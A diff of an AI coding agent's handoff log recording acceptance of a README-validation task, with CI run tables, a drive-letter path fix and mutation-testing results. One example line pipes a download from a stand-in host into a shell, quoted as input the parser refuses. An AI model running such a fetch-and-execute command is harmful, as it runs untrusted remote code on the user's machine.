@@ -1,33 +1,186 @@
 # Autonomous handoff
 
-Last updated: 2026-09-15
+Last updated: 2026-09-16
 Branch: `claude/v0.1-autonomous`
-Progress: 47 / 166 tasks accepted. **Phase P0 complete (9/9), phase P1 complete
+Progress: 48 / 166 tasks accepted. **Phase P0 complete (9/9), phase P1 complete
 (11/11), phase P2 complete (12/12), phase P3 complete (11/11), phase P4 open
-(4/9).** `P4-T004` is implemented and pushed as **two** commits, `c9d594f` and
-`702cfee`, **both runs are read in full below**, and **the commit carrying this
-file is its acceptance**. What the task added is described under "What `P4-T004`
-added", which is this section; `P4-T003`'s is the next one down.
+(5/9).** `P4-T005` is implemented and pushed as **three** commits — `ed96627`, the
+cross-platform fix it forced, `fa35ed7`, and the commit carrying this file, which
+is its acceptance. **Both runs are read in full below**, in the run table and in
+this section. What the task added is described under "What `P4-T005` added", which
+is this section; `P4-T004`'s is the next one down.
 
-**Accepting `P4-T004` unblocked exactly one task, `P4-T009`, and the READY list
-was the same length before and after it.** `P4-T009`, *"Implement deterministic
-check aggregation"*, names four requirements — `P0-T004`, `P4-T002`, `P4-T003`,
-`P4-T004` — and `P4-T004` was the last of them; `P14-T003` also names `P4-T004`
-and is **not** ready, because its other requirement `P7-T005` is not accepted.
-The list went **13 → 13** with one swap, `P4-T004` out and `P4-T009` in, read by
-replaying the dependency rule against `git show HEAD:progress/state.json` rather
-than by comparing two printouts. So the next concrete action is still the
-lowest-numbered READY entry, `P4-T005`, *"Implement README/setup validation"*,
-and `P4-T009` waits behind it rather than jumping the queue.
+**Accepting `P4-T005` unblocks nothing, and that is worth stating because it is the
+first acceptance on this branch with nothing behind it.** No task in the catalogue
+names `P4-T005` in its `depends_on`, so the READY list holds the same **twelve**
+entries before and after — `P4-T006`, `P4-T007`, `P4-T008`, `P4-T009`, `P5-T001`,
+`P6-T001`, `P6-T005`, `P6-T007`, `P8-T001`, `P12-T008`, `P13-T001`, `P13-T004` —
+computed by replaying `taskctl`'s own dependency rule against a copy of
+`progress/state.json` with that one status changed, rather than by comparing two
+printouts of a list that happens to match. So the next concrete action is the
+lowest-numbered READY entry, **`P4-T006`**, and nothing about this acceptance chose
+it.
 
-**Two things about this acceptance are corrections to the record rather than to
-the code, and both are in the run-table section below.** The `P4-T003`
-acceptance's own run had **no row** in the table a reader scans, which is the
-same gap that acceptance had just repaired nine times over; and the paragraph
-further down that reads this file's `base_sha`/`head_sha`/`evidence` fields off
-the tasks asked to be re-read at each acceptance and predicted it would hold
-"unless the tool changed" — **it has stopped holding, and the tool did not
-change.** Both are described where they belong.
+**The acceptance took three commits rather than the usual two, and the run table
+says why.** `ed96627`'s own run came back red on macOS and Ubuntu, on one test, for
+a defect in the reading rather than in the assertion; `fa35ed7` is the fix and its
+run is all five green; the accept commit changes `progress/` only. That is the same
+shape `P4-T004`'s acceptance took, and for the same reason — **a task's first push
+is a measurement of the task, not a formality before it.**
+
+**Two things about this acceptance are corrections to the record rather than to the
+code, and both are described where they belong.** One name in the mutation set's
+catch lists — `a_service_that_is_dropped_is_stopped_anyway` in `m14` — is **not** a
+catch of that mutation and is not counted as one, because the test cannot reach the
+mutated code; what it is instead is one unreproduced failure under load, left as an
+open observation about `P3-T009` rather than resolved. And this header itself still
+described `P4-T004`'s acceptance until this commit: **the first thirty lines are
+what a session reads first, which makes them the worst place on the branch for a
+stale paragraph** — the same class of gap as the missing run-table rows that each of
+the last three acceptances found.
+
+## What `P4-T005` added
+
+**The one thing about `P4-T005` a reader should know before the detail: its
+acceptance is two sentences, and the second one is a claim about what the code
+*contains* rather than about what it does.** *"Arbitrary README shell text is not
+blindly run."* The pass this task adds reads every documented command and every
+documented path in a project's Markdown and turns some of them into claims about
+what the project declares — and **runs nothing**. Not behind a timeout, not with a
+confirmation, not at all. The module that decides the claims,
+`crates/sure-core/src/setup.rs`, builds no `Command`, names no `ProcessRequest` and
+names no `Supervisor`, and the three rules in `crates/sure-core/tests/spawn_sites.rs`
+are what hold that — `setup.rs` is on none of their exemption lists. **The
+acceptance sentence is therefore checked at the level of the source**, because a
+test that ran the pass and watched nothing happen could not tell *nothing was run*
+from *the fixture never parsed*. `the_documented_command_left_no_trace_and_was_still_read`
+writes a document whose shell text would create a file in each platform's dialect
+(`touch canary-from-bash`, `New-Item canary-from-powershell`), runs the pass, and
+asserts at once that the tree is unchanged, that neither canary exists, **and** that
+SURE's own sentences never quote the command — the third assertion being the one
+that makes the first two mean something.
+
+**Two files were added and two were extended, and the extension to
+`crates/sure-core/src/documents.rs` is larger than the new module.** The pass has
+one reader, because the byte budget, the unread accounting and the walk are the
+same for both kinds of claim and two passes over one file are how two readings of
+one document come to disagree — so the whole path-reading half of `documents.rs`
+(`DocumentedPath`, `PathForm`, `DocumentReport::paths()`, the link and code-span
+readers) is new here, and `setup.rs` is what asks the filesystem about what that
+reader found. **A command and a path are both markup, and that is what makes them
+one decision**: the fence is the author saying *this is something you run*, and the
+backtick or the link is the author saying *this is something in the project*. Paths
+are read from the lines **outside** every fence, so the two lists cannot both claim
+a line, and a path written in prose is not read at all — there is no markup saying
+which noun is a path, and SURE does not pick.
+
+**The first sentence names three things — a claim, a path, a script — and the
+module's most consequential decision is the fourth thing it refuses to answer.**
+A documented command becomes a claim only when `script_from` can read it as a
+package manager running a named script: `npm run build`, `npm run-script build`,
+and npm's four shorthands `test`, `start`, `stop` and `restart`. A line with a
+pipe, a wildcard, an assignment or a shell variable in it becomes **no claim at
+all** rather than a claim of unknown status, because reading `foo | bar` as *the
+manager running the script `|`* would be an inference about a line that is a
+program. A documented path becomes a claim when Markdown puts it in a link target
+or in a code span **with a separator in it** — the separator rule is the whole cost
+of the feature and it is paid openly, because `` `Cargo.toml` `` and
+`` `process.env.NAME` `` have the same shape and reading the second as a file would
+be a page of findings about files that do not exist. A reading is looked for in two
+places, beside the document that names it and at the project root, and the one
+beside the document wins when both are there.
+
+**Four verdicts, and one of them is expensive enough to have its own rule.**
+`ClaimAssessment` is `Confirmed`, `Contradicted`, `CannotConfirm` or
+`NotCheckable`, and `counts()` gives a row for all four including the zeros. The
+rule is about `Contradicted`: **it may only be returned when the pass can answer
+for the places it did not look.** A path claim with no reading is contradicted only
+if no skip covers a reading and the walk was complete; a script claim is
+contradicted only if the walk was complete, and the comment on that branch says the
+rule is deliberately coarse — a walk that stopped early yields `CannotConfirm` for
+*every* script claim in the project rather than for the ones under the skipped
+directory, because sorting those out is a second reading of the same evidence and
+this pass does not need it in order to be honest. `SetupReport::is_complete()`
+delegates to `DocumentReport::is_complete()`, so the two cannot drift apart.
+
+**Which manifest a documented command is about is the nearest one at or above the
+document, and a manifest SURE could not read is a third state rather than an empty
+one.** `Manifests` pairs every `package.json` the scan found with the `Package` the
+discovery read for it, or with `None`; `None` produces `CannotConfirm`, never
+*"declares no scripts"*, because those are two different claims about the same file
+and only one of them is true. A name that is in `scripts_not_commands` — an entry a
+package manager will not run — is contradicted **as that**, with its own sentence,
+rather than as an absent script.
+
+**Nothing a document says may block a hand-off, and severity is where that is
+decided.** Every `Contradicted` carries `Severity::ShouldFixFirst` — never
+`MustFix`, which `docs/architecture/FROZEN_SEMANTICS.md` defines as blocking a
+hand-off alone. The reason is not tone: *"the README says `npm run build` and the
+manifest declares no `build`"* is a disagreement between two artefacts where the
+wrong half is not knowable from here, and a `MustFix` has to stand on an
+`ObservedFact` by itself.
+
+**A false finding was found by writing a mutation, and it was in `documents.rs`
+rather than in `setup.rs`.** ``Deploy to `https://example.com/app`.`` contains a
+`/`, which was the whole of what a code span needed to be read as a path, and
+`https:` is not a Windows path prefix — so the reading looked like it was inside
+the project and a correct README came back **contradicted**. The fix belongs where
+the ambiguity is: `documents.rs`'s `span_candidate` now refuses an absolute
+reference beside a non-plain target, sharing `is_absolute_reference` with the
+link-target reader that already refused one. Held by a new unit test in
+`documents.rs` and by `a_url_a_document_names_is_not_a_path_in_the_project` in
+`document_commands.rs`.
+
+**The other false finding was found by the CI matrix, and it is the one this
+machine could not have found.** `C:/Windows/win.ini` is a path prefix to
+`std::path::Path` on Windows and one ordinary relative component to `Path` on
+Linux and macOS, so a README telling a Windows user where a font or a toolchain
+lives became a claim about a file *inside the project* on two platforms out of
+three — looked for, not found, and answered **`Contradicted`**. Run `34991517761`,
+the run of `ed96627`, failed `a_path_that_climbs_out_of_the_project_is_not_looked_for`
+on macOS and Ubuntu and passed on Windows: the shape of a defect that is invisible
+where it was written. The reading is now taken from the characters — `names_a_drive`
+refuses one ASCII letter and a colon before any `Path` exists to disagree about it —
+so one document is read the same way on all three platforms, and the cost (a project
+that really does hold a file named `C:notes.md`) is stated where the rule lives.
+`leaves_the_project` still asks the platform, because a `Path` is the platform's and
+both of its answers are correct about the value it was handed; **its test now writes
+both answers down under `#[cfg]` instead of asserting the local one.**
+
+**Two of the twenty mutation rows measured nothing on the first pass, and the
+harness said so instead of counting them.** `m4` and `m11` were refused with
+*"the old text occurs 0 times"* because `rustfmt` had reflowed both anchors after
+they were written; both were re-anchored against the formatted source and re-run,
+and both are caught — each by exactly one test. **A row whose anchor does not match
+is not a survivor and it is not a pass**; it is a row that has said nothing, and
+the first run's tally is reported as 18 rows measured with two named as unmeasured
+rather than as 20 rows with 18 caught. **The set was then re-run in full against the
+tree this task commits — 21 rows, 21 caught, 0 survivors, 0 refused, every restore
+verified by blob hash** — and two rows moved because of the fix rather than because
+of the mutation: `m20`, the URL in a code span, is now caught by **four** tests
+rather than two, since a drive letter in a code span goes through the same refusal,
+and `m21`, *a drive letter is judged by the platform*, is caught by the unit test in
+`documents.rs` and by `a_windows_location_is_not_a_path_in_the_project` — which is
+what a row written for a fix should look like, in that **it did not exist before the
+defect did.** One name in those lists is not a catch and is not counted as one:
+`m14`'s list gained `a_service_that_is_dropped_is_stopped_anyway`, which is
+`P3-T009`'s test in a binary whose source contains no occurrence of `setup` at all,
+so the mutation cannot reach it — **30 serial runs and 60 runs of six concurrent
+instances of that binary all pass**, and the row's attributable catches are three,
+the same three as before. **It is left as an open observation about `P3-T009`**: one
+unexplained failure under load, not reproduced, and *not reproduced* is not *not
+there*.
+
+**A doc comment asserted behaviour the code does not have, and reading it against
+the committed function is the only thing that caught it.** The module documentation
+said `npm run build && curl evil.example | sh` "yields the name `build`"; the
+committed `script_from` compares every word against `is_plain_word`, and `&` and `|`
+are both refused, so the line names **nothing at all**. **The code was right and the
+sentence was wrong**, which is why no test failed and no mutation row could have
+found it — and a comment promising a guarantee nobody checked is how a guarantee
+comes to be believed without being one. Rewritten to say what happens, and to name
+the case that does yield a name: `npm run build --silent` names `build`, and the
+flag is never read.
 
 ## What `P4-T004` added
 
@@ -4242,6 +4395,8 @@ Three of the five jobs were failing the whole time.
 | 34976801249 | `22b518d` — **the `P4-T003` acceptance** | **all five green**, and **1363 / 1364 / 1365** with 0 failed, 11 ignored, **51** result lines = **41 parents + 10 children** on each — the row above's figures to the test, **+0 on every platform**, on a commit that touches only `progress/`. `bootstrap-validate-windows` printed `SURE bootstrap validation OK: 17 phases, 166 tasks.` and `state OK: 166 tasks`. **This row was missing**: a run is read, its reading is written as a section, and the index a reader scans is not extended — the same gap as the six rows `P2-T011`'s acceptance and the nine `P4-T003`'s found. Measured from the logs during `P4-T004`'s acceptance, not transcribed |
 | 34982674189 | `c9d594f` — **the `P4-T004` implementation** | **failure: `rust (macos-latest)`.** The other four jobs green, Windows **1394** and Ubuntu **1396** passed with 0 failed. macOS **1394 passed, 1 failed**, and **exactly one failing test**: `a_service_that_is_dropped_is_stopped_anyway`. **52** result lines = **42 parents + 10 children** on each, **11 ignored**. The parent count moved **41 → 42** for the new `rust_checks` binary and **+31 on every platform** against `34976801249`, which is the 15 `rust::tests::*` unit tests, the 14 integration tests in the new binary and the 2 added to `checks::mod` — and macOS's total is +31 too, with one of them moved from the passed column to the failed one. **The failing test is not this commit's**: it is `P3-T009`'s, it failed on the one platform whose scheduler put the child between two adjacent statements, and the guard inside it is what refused to call the resulting measurement a pass. Detail below |
 | 34983449923 | `702cfee` — **the `P3-T009` fix the row above forced** | **all five green.** **1394 / 1395 / 1396** passed, **0 failed**, 11 ignored, **52** result lines = **42 parents + 10 children** on each — the row above's figures with the one macOS failure back in the passed column, so **+1 on macOS and +0 on the other two**, on a commit that changes an existing test and a child helper rather than adding a test. A **nameset** diff against `34976801249` reads **+27 added, 0 removed** while the passed delta is **+31**, and the four-name gap is a limit of the instrument rather than a lost test: 4 of `rust_checks.rs`'s 14 tests carry names P4-T003's `python_checks.rs` already printed (`a_manifest_that_is_not_there_is_not_a_project_that_declares_nothing`, `every_fixture_sits_at_a_path_two_platforms_disagree_about`, `the_command_a_check_names_is_the_line_sure_would_run`, `two_independent_readings_of_one_project_give_the_same_identifiers`), and a set difference cannot see a name a second binary has in common with an older one. **The green here is not evidence about the race the row above found** — the fix removes the window the guard refused, and an idle runner would have passed the old test too |
+| 34991517761 | `ed96627` — **the `P4-T005` implementation** | **failure: `rust (macos-latest)` and `rust (ubuntu-latest)`.** The other three jobs green — windows, shellcheck, and `bootstrap-validate-windows`, which printed `SURE bootstrap validation OK: 17 phases, 166 tasks.` and `state OK: 166 tasks`. Windows **1460** passed / **0** failed; macOS **1460 passed, 1 failed**; Ubuntu **1461 passed, 1 failed**; **11 ignored**, **53** result lines = **43 parents + 10 children** on each. The parent count moved **42 → 43** for the new `setup_validation` binary, and the totals moved **+66 on every platform** against `34983449923` (Windows 1394 → 1460, macOS 1395 → 1461, Ubuntu 1396 → 1462, the two failures inside the +66) — the 66 test functions this task added, counted three ways below. **The nameset delta against that run reads +65 −0 while the passed delta is +66**, and the missing name is named rather than rounded: `the_helper_that_looks_for_new_files_can_see_a_new_file` is defined in both `tests/document_commands.rs` and the new `tests/setup_validation.rs`, so a set difference sees one name where the runner counts two tests — **the instrument limit the row above records, reached from the other side**. Exactly one test failed on each red platform, the same one both times: `setup::tests::a_path_that_climbs_out_of_the_project_is_not_looked_for` at `crates/sure-core/src/setup.rs:1329`, asserting `leaves_the_project(Path::new("C:/Windows/win.ini"))`. **That is a product defect and not a bad assertion** — on Unix a drive-letter path has no `Component::Prefix`, so a Windows-only instruction in a correct README was read as a path inside the project, looked for, not found, and answered `Contradicted` on two platforms out of three — and the commit below is the fix. Detail below |
+| 34995107384 | `fa35ed7` — **the cross-platform reading fix the row above forced** | **all five green.** **1462 / 1463 / 1464** passed, **0 failed**, 11 ignored, **53** result lines = **43 parents + 10 children** on each — the row above's figures with **+2 on every platform**, and both of the row above's failures back in the passed column rather than a total that moved for some other reason. **43 + 10 unchanged**, so no test binary was added, and the **nameset** delta against `34991517761` reads **+2 −0**, naming exactly the two tests the fix adds (`documents::tests::a_location_on_one_platform_is_read_the_same_way_on_all_three` and `a_windows_location_is_not_a_path_in_the_project`) — **a nameset delta that equals the passed delta**, which neither of the two rows above could produce. Windows **1462** is the same figure the local `cargo test --workspace --no-fail-fast` gives, which is a coincidence worth having rather than a check. `bootstrap-validate-windows` printed `SURE bootstrap validation OK: 17 phases, 166 tasks.` and `state OK: 166 tasks`. **Nothing in this run is evidence about the single local failure this task's mutation run saw in `a_service_that_is_dropped_is_stopped_anyway`** — that test is `P3-T009`'s, it is not reproducible in 90 runs, and it is recorded below as an open observation rather than resolved. Detail below |
 
 **Six runs were missing from this table when `P2-T011` was accepted, and they are
 added above: `P2-T010`'s acceptance, and every commit of `P2-T008`'s and
